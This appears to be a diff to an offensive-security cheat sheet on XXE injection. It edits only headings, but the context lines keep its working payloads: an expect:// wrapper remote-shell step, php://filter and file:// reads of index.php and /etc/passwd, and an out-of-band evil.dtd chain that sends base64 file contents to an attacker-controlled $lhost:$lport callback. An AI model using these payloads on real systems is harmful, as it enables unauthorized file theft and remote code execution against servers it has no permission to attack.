@@ -4,11 +4,9 @@
 
 ### XXE RCE
 
-Spawn XXE RCE with Xxe_injection.
-
 XXE that abuses the `expect://` PHP wrapper to fetch and execute a remote shell. Requires the expect extension to be loaded on the server.
 
-```sh title:"Xxe Injection Spawn XXE RCE"
+```sh title:"Xxe_injection XXE via expect:// wrapper to fetch remote shell"
 # Inject this into your request and call &company in the right field to execute the payload, remember to set your listener so the target can download your payload.
 <?xml version="1.0"?>
 <!DOCTYPE email [
@@ -23,11 +21,9 @@ import tun_ip
 
 ### XXE base64 file read
 
-Read XXE base64 file read with Xxe_injection.
-
 Use the PHP base64 filter to read a file safely (avoids XML parse errors when source contains `<` or `&`). Decode the result client-side.
 
-```sh title:"Xxe Injection Read XXE Base64 File Read"
+```sh title:"Xxe_injection Read file via php://filter base64, decode client-side"
 # Inject this into your request inside the XML field to read 'index.php' and call &company in the right field to execute the payload, decode the result using 'echo $data | base64 -d > file && cat file'
 <!DOCTYPE email [
   <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
@@ -41,11 +37,9 @@ var data
 
 ### XXE plaintext file read
 
-Read XXE plaintext file read with Xxe_injection.
-
 Plain `file://` read. Works for files without XML-breaking characters; falls over on PHP source with `<?` tags.
 
-```sh title:"Xxe Injection Read XXE Plaintext File Read"
+```sh title:"Xxe_injection Plain file:// read for XML-safe files"
 # Inject this into your request inside the XML field to read '/etc/passwd' and call &company in the right field to execute the payload.
 <!DOCTYPE email [
   <!ENTITY company SYSTEM "file:///etc/passwd">
@@ -54,11 +48,9 @@ Plain `file://` read. Works for files without XML-breaking characters; falls ove
 
 ### XXE blind OOB
 
-Read XXE blind OOB with Xxe_injection.
-
 Out-of-band XXE chain: parser fetches `evil.dtd` from your server, embeds the target file contents into a URL, and requests it back. Use when the response body doesn't echo entities.
 
-```sh title:"Xxe Injection Read XXE Blind OOB"
+```sh title:"Xxe_injection OOB XXE chain: external dtd exfils via callback URL"
 Step 1: Set up a file like this called evil.dtd
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % oob "<!ENTITY content SYSTEM 'http://$lhost:$lport/?content=%file;'>">
